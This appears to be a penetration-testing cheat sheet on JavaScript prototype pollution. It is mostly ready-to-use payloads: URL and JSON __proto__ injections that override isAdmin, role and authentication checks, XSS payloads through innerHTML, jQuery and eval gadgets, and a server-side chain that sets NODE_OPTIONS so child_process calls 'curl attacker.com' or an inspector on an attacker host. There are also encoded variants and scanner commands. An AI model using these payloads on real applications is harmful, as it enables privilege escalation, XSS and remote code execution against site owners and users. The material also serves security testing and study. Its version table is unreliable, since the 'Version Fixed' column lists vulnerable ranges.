# Prototype Pollution

## What It Is (JavaScript for Hackers)

JavaScript objects inherit properties from their prototype. If an attacker can set `Object.prototype.foo = "bar"`, then ALL objects will have a `.foo` property. This can override security checks, inject properties, and sometimes lead to RCE.

## Client-Side Prototype Pollution

### Detection
```javascript
// Test URL parameter:
https://target.com/?__proto__[foo]=bar
https://target.com/?constructor[prototype][foo]=bar

// Check in browser console:
console.log(Object.prototype.foo)  // if "bar" → vulnerable!
console.log({}.foo)                 // if "bar" → vulnerable!
```

### Common Pollutable Sinks
```javascript
// URL parameter parsing:
?__proto__[x]=1
?__proto__.x=1

// JSON deep merge (lodash <4.17.12):
_.merge({}, JSON.parse('{"__proto__":{"polluted":true}}'))

// Object.assign with user input:
Object.assign(target, JSON.parse(userInput))

// Deep extend functions:
$.extend(true, {}, JSON.parse(userInput))
```

### Exploitation: Override Security Checks
```javascript
// If app checks: if (user.isAdmin) { ... }
// And there's prototype pollution:
// ?__proto__[isAdmin]=1
// Then: ({}).isAdmin === "1" === truthy → bypasses check!

// Override isAuthenticated
?__proto__[isAuthenticated]=1

// Override role
?__proto__[role]=admin

// Override whitelisted property
?__proto__[whitelisted]=true
```

### Prototype Pollution to XSS
```javascript
// If app does: elem.innerHTML = options.template || 'default'
// And template not set, falls back to Object.prototype.template:
?__proto__[template]=<img src=x onerror=alert(1)>

// Via innerHTML sink:
?__proto__[innerHTML]=<img src=x onerror=alert(1)>

// Via jQuery .html():
?__proto__[html]=<img src=x onerror=alert(1)>
```

### Finding Gadgets

A "gadget" is existing code that, when prototype is polluted, creates a security impact:

```javascript
// Gadget 1: innerHTML sink
if (options.dangerouslySetInnerHTML) {
    element.innerHTML = options.dangerouslySetInnerHTML;
}
// Pollution: ?__proto__[dangerouslySetInnerHTML]=<img src=x onerror=alert(1)>

// Gadget 2: URL navigation
let url = config.redirectUrl || '/default';
window.location = url;
// Pollution: ?__proto__[redirectUrl]=javascript:alert(1)

// Gadget 3: setTimeout with string
let delay = options.delay || 0;
let fn = options.callback || 'doSomething';
setTimeout(fn, delay);
// Pollution: ?__proto__[callback]=alert(1)

// Gadget 4: eval
eval(config.customScript || '');
// Pollution: ?__proto__[customScript]=alert(1)
```

## Server-Side Prototype Pollution (SSPP) — JavaScript for Hackers

### Why It's More Dangerous
Node.js shares a single `Object.prototype` across the entire runtime. Polluting it affects ALL subsequent object operations, potentially causing:
- RCE via `child_process.spawn`
- Authentication bypass
- Denial of service

### Detection (Safe Method)
```javascript
// Use non-existent prototype property as canary:
{"__proto__":{"status":510}}

// Then: send invalid JSON request → server normally returns 400
// If server returns 510 → SSPP confirmed!
// The 510 was injected into Object.prototype and used for error responses
```

### Common SSPP Vectors
```javascript
// Vulnerable deep merge function:
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);  // Recursion allows __proto__
    } else {
      target[key] = source[key];
    }
  }
}

// Attacker payload:
{"__proto__": {"polluted": true}}
// or:
{"constructor": {"prototype": {"polluted": true}}}
```

### RCE via SSPP + child_process.spawn

Node.js `child_process.spawn` uses options.shell and options.env from prototype if not set:
```javascript
// If spawn is called somewhere with user-controlled options:
// child_process.spawn('somecommand', options)

// Prototype pollution:
{"__proto__": {
  "shell": "node",
  "NODE_OPTIONS": "--inspect=attackerserver.com:4444"
}}

// Or via env:
{"__proto__": {
  "env": {
    "NODE_OPTIONS": "-e 'require(\"child_process\").execSync(\"curl attacker.com\")'"
  },
  "shell": true
}}
```

### PP via URL Query Parameters
```javascript
// qs library (query string parsing):
?__proto__[polluted]=true

// express-query-parser:
?constructor.prototype.polluted=true

// Pollution through nested objects:
?user[__proto__][admin]=1
```

### Tools for Prototype Pollution

```bash
# PPScan - client-side PP scanner
npm install -g ppscan
ppscan https://target.com

# Server-Side Prototype Pollution Scanner (Burp Extension)
# - Automatically probes JSON endpoints for SSPP

# Manual testing:
# Add __proto__ key to any JSON body or URL param
# Monitor for changed behavior
```

## Deep Merge Libraries with Known PP Vulnerabilities

| Library | Version Fixed | Vector |
|---|---|---|
| lodash | < 4.17.12 | `_.merge()`, `_.mergeWith()`, `_.defaultsDeep()` |
| jquery | < 3.4.0 | `$.extend(true, ...)` |
| hoek | < 5.0.3 / 4.2.1 | `hoek.merge()` |
| mquery | < 3.2.3 | `mquery.merge()` |
| set-value | < 2.0.1 | `set(obj, path, val)` |
| unset-value | see GHSA | |
| node-forge | < 0.10.0 | |

## Prototype Pollution Testing Methodology

### Client-Side
1. Identify URL parameter parsing libraries (qs, jQuery param, etc.)
2. Test: `?__proto__[x]=canary` — check console for `Object.prototype.x === "canary"`
3. Test: `?constructor[prototype][x]=canary`
4. Find gadgets: search source code for properties used from untrusted config objects
5. Chain pollution with gadget to achieve XSS or logic bypass

### Server-Side
1. Identify JSON merge endpoints
2. Inject `{"__proto__": {"status": 510}}` in any JSON body
3. Trigger an error condition, check if response status is 510
4. If confirmed, find gadgets in the Node.js codebase
5. Escalate to RCE via spawn options or eval

## Prototype Pollution Payload Reference

```
// URL-based
?__proto__[property]=value
?__proto__.property=value
?constructor[prototype][property]=value
?constructor.prototype.property=value

// JSON-based
{"__proto__": {"property": "value"}}
{"constructor": {"prototype": {"property": "value"}}}

// Nested
?a[__proto__][property]=value

// Encoded
?%5F%5Fproto%5F%5F[property]=value
```

## Severity
- **Medium**: Client-side prototype pollution enabling XSS
- **High**: Authentication bypass via PP (is_admin override)
- **Critical**: Server-side PP enabling RCE via Node.js child_process
